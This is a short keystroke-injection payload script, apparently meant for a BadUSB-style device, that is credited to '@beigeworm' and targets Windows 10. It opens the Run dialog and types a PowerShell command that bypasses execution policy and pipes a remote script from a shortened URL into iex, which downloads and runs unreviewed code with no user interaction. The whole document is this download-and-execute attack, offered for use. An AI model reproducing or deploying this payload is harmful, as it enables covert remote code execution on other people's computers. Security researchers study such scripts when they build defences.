// Title: beigeworm's Tool Suite GUI
// Author: @beigeworm
// Description: This script Starts a GUI with a huge set of tools.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -C irm is.gd/bwtoolset | iex");
delay(500);
press("ENTER");

